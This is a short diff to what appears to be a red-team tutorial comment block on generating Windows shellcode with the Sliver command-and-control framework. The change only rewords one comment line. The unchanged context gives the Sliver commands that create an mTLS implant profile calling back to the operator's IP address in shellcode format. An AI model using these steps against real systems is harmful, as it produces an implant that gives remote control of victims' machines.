@@ -1,5 +1,5 @@
 //You can use whatever method you want to generate your shellcode, I will be using sliver for generation and sublime for reading.
-//First, open up sliver and run the following commands
+//First, open up sliver in your linux terminal and run the following commands
 
 sliver-server
 profiles new --mtls {youripaddress} --format shellcode win-shellcode
